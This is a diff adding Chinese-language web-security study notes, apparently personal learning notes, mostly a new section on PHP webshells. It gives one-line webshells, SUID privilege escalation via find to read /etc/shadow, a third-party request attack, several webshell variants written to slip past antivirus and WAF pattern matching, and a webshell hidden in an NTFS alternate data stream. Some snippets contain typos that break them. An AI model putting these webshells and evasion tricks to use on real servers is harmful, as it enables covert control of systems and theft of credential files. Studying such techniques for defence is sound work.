@@ -523,6 +523,7 @@
   - 关闭 容器：docker stop zealous_heyrovsky
   - 启动 已经存在的容器：docker start zealous_heyrovsky
   - 重启容器：docker restart zealous_heyrovsky
+  - docker 重命名：docker rename busy_blackwell centos
 
 
 
@@ -3291,6 +3292,280 @@ Linux 用户分为管理员和普通用户，普通用户又分为系统用户�
 
 
 ### Webshell 
+
+#### Webshell 定义
+
+- Webshell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种代码执行环境，也可以将其称做为一种**网页后门**。
+- 攻击者在入侵了一个网站后，通常会将 asp 或 php 后门文件与网站服务器 Web 目录下正常的网页文件混在一起，然后就可以使用浏览器来访问 asp 或者 php 后门，得到一个命令执行环境，以达到控制网站服务器的目的。 
+
+
+
+#### Webshell 作用
+
+1.维持远程访问
+
+2.权限提升
+
+3.发动网络攻击 
+
+
+
+#### Webshell - 维持远程访问 
+
+- <?php @eavl($_REQUEST[’cmd’]);?>
+- 一句话木马就是最典型的 WebShell
+- 通过一句话木马就可以远程访问服务器并执行命令
+- 通过对该文件传入相应的命令就可以在服务器上执行该命令 
+- 测试链接
+  - http://127.0.0.1/test.php?cmd=phpinfo();
+
+
+
+#### Webshell - 权限提升 
+
+- 当我们通过 Webshell 执行命令的时候通常只有 WWW 权限 
+
+  - http://127.0.0.1/test.php?cmd=system('whoami');
+  - 返回：www-data
+
+- 这里介绍一种使用 SUID 提权的方式
+
+  - 通过下面的命令找到机器上具有 SUID 权限的文件
+
+    - http://127.0.0.1/test.php?cmd=system(“find / -user root -perm -4000 -print 2> /dev/null"); 
+    - 只要出现的目录中存在 `/usr/bin/find` 就很好
+
+  - 在当前工作目录下创建一个 pentestlab 文件
+
+    - http://127.0.0.1/test.php?cmd=system("touch pentestlab;"); 
+
+  - 执行下面的命令查看权限 
+
+    - http://127.0.0.1/test.php?cmd=system("find pentestlab -exec whoami \;"); 
+      - 此时就会出现 root 权限的结果，但是请求用户并不是，就实现了提权
+
+  - 通过 find 执行的命令都是以 root 权限运行的
+
+    - http://127.0.0.1/test.php?cmd=system(“cat /etc/shadow"); 
+      - 此时是 www-data 权限，无法创建文件
+    - http://127.0.0.1/test.php?cmd=system("find pentestlab -exec cat /etc/shadow \;"); 
+      - 此时是 root 权限，可以获得shadow文件的内容
+
+  - SUID 权限
+
+    - Linux 环境下的一种除了 rwx 之外的附加权限 ，属于特殊权限
+    - 查看命令：`ls -l /usr/bin/find`
+
+    ![1617875142059](HackerMeWeb.assets/1617875142059.png)
+
+  - 提权过程分析 
+
+    ![1617875168763](HackerMeWeb.assets/1617875168763.png)
+
+
+
+#### WebShell - 网络攻击 
+
+- 这里以第三方攻击为例 
+
+  ![1617875254582](HackerMeWeb.assets/1617875254582.png)
+
+- 为了看到攻击效果，在服务器 A 上存在如下的程序 
+
+  ```php
+  <?php
+      $content = $_GET['content'];
+      $file = fopen('content.txt', 'w');
+      $ip = $_SERVER['REMOTE_ADDR'];
+      fwrite($file, $ip);
+      fwrite($file, '-');
+      fwrite($file, $content);
+      fclose($file);
+  ?>
+  ```
+
+- 访问服务器 A上的 http.php 文件
+
+  - http://192.168.25.173/http.php?url=http://192.168.25.169/test.php?content=‘hello,world’ 
+
+- 服务器 B 上生成如下文件 
+
+  ```sh
+  192.168.25.173-hello,world
+  ```
+
+  
+
+
+
+#### 免杀 Webshell 
+
+##### 免杀基础
+
+-  `<?php @eval($_REQUEST['cmd']);?> ` 
+  - 在实际的系统中，一旦书写的文件包含上的内容，就会被认定为网页木马，被杀毒软件发现
+- 杀毒软件的原则
+  - 目前的安全产品对于木马查杀使用的是**正则匹配**的方式，因此我们要做到免杀首先要清楚安全防护软件匹配的内容。
+  - eval 是一个危险函数，但是并不是简单的只是匹配 eval，通过测试发现，单纯的 eval 并不会被过滤，实际过滤的的内容为：
+  - <?assert($_REQUEST[;?>
+  - <?eval($_REQUEST[;?> 
+
+
+
+##### 免杀 - 常量定义 
+
+- ```php
+  <?php
+      define("a", "$_REQUESTP[cmd]");
+  	eval(a);
+  ?>
+  ```
+
+- 上面的代码通过定义常量的方式将 eval 与 `$_REQUEST` 进行了拆分
+
+- 经测试该代码可以绕过 WAF 的检查
+
+- 同时在执行的时候 a 会被替换为 `$_REQUEST[cmd]`
+
+- 能够完成 Webshell 的功能 
+
+
+
+##### 免杀 - 定义函数 
+
+- ```php
+  <?php
+  function a($a) {
+      return $a;
+  }
+  eval(a($_REQUEST)['cmd']);
+  ?>
+  ```
+
+- 上面的代码通过定义函数的方式将 eval 与 `$_REQUEST` 进行了拆分
+
+- 经测试该代码可以绕过 WAF 的检查
+
+- 通过自定义的函数将 `$_REQUEST` 原样输出，将 `eval` 与 `$_REQUEST` 拆分开 
+
+
+
+##### 免杀 - 定义类
+
+- ```php
+  <?php
+  class User {
+      public $name = '';
+      function __destruct(){
+          eval("$this -> name");
+      }
+  }
+  $user = new User;
+  $user -> name = ''.$_REQUEST['cmd'];
+  ?>
+  ```
+
+- 类在析构的时候会调用 `__destruct()` 方法，而该方法的作用是调用 eval 执行 name 中的内容，name 被赋值为了 `$_REQUEST[‘cmd’]`，也就是说类在析构的时候调用了`eval($_REQUEST[‘cmd’]) `
+
+- 上面的代码通过定义类的魔术方法的方式将  eval 与 `$_REQUEST` 进行了拆分
+
+- 经测试该代码可以绕过 WAF 的检查
+
+
+
+##### 免杀 - 多方式传参 
+
+- ```php
+  <?php
+  $COOKIE = $_COOKIE;
+  foreach($COOKIE as $key => $value){
+      if($key == 'assert'){
+          $key($_REQUEST['cmd']);
+      }
+  }
+  ?>
+  ```
+
+- 上面的代码需要结合对脚本的传参才能够发挥Webshell 的作用，是一种比较强的绕过方式。 
+
+- 访问：http://127.0.0.1/test.php?cmd=phpinfo();
+
+  - 需要手动添加 Cookie 字段，携带的内容为 `Cookie: assert=what`
+  - 此时脚本就可以进入if判断执行了
+
+- 执行流程
+
+  ![1617877377470](HackerMeWeb.assets/1617877377470.png)
+
+
+
+##### 免杀 - 特殊调用
+
+- ```php
+  <?php
+  $a = get_defined_functions();
+  $a['internal'][841]($_REQUEST['cmd']);
+  ?>
+  ```
+
+- 使用特殊的方式调用 assert 函数 
+
+- 经测试该种方式可以绕过 WAF 的检查 
+
+- 通过 `get_defined_functions()`会得到下面的内容
+
+- `$a[‘internal’][841]` 对应的内容就是 `assert `
+
+  ![1617877658937](HackerMeWeb.assets/1617877658937.png)
+
+
+
+#### 隐藏 Webshell 
+
+- 首先需要上传如下的文件并执行 
+
+- ```sh
+  <?php
+      $file = fopen("/:new.php", "w");
+      fwrite($file, "<?php eval(\$_REQUEST[666])?>");
+  ?>
+  ```
+
+- 该文件执行后会往服务器上写入木马，该木马程序的文件名为/:new.php 
+
+- 但是在该目录下看不到该文件，同时使用 WAF 也扫描不出来 
+
+- 同时我们在该目录下能够构造一个文件包含的场景 
+
+- ```php
+  <?php include('/:new.php');?>
+  ```
+
+- 访问该文件并对 666 传参的时候，http://127.0.0.1/include.php?666=phpinfo();
+
+- 能够成功的执行木马文件 
+
+- 关键知识点：NTFS 交换数据流 
+
+  - 它是 NTFS 磁盘的一个特性
+  - 存在主流文件和非主流文件的区分
+  - 主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。
+  - 格式 
+    - 宿主文件：关联的数据流文件
+    - 例如: 1.txt:2.txt, 2.txt寄生在1.txt文件上 
+  - 这里所创建的是一个单独的文件流：new.php 
+
+- 这种隐写方式依赖于 NTFS 文件流，因此该种方法只适用于 Windows。 
+
+
+
+### NoSQL 注入 
+
+
+
+
+
+
 
 
 
